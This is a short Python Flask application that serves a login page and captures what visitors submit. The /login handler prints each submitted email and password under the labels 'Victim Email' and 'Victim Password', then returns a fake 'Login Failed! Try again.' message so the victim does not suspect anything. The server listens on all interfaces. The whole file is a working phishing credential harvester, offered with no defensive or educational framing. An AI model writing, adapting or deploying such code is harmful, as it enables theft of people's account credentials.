from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    print(f"Victim Email: {email}")
    print(f"Victim Password: {password}")
    return "Login Failed! Try again."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5555)
